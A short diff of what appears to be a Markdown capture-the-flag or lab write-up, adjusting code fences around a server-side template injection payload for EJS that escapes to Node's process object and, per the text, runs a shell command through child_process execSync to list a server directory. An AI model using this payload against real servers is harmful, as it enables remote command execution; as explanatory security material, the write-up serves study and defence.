@@ -164,7 +164,7 @@ Why this works:
 
 **Payload used**
 
-``
+```
 <%- (function(){
   try{
     var p = this.constructor.constructor('return process')();
@@ -174,7 +174,8 @@ Why this works:
   }catch(e){ return e.toString() }
 })() %>
 
-``
+```
+
 **What this does :**
 
 - Uses `process.mainModule.require('child_process').execSync` to run `ls -la /srv`.
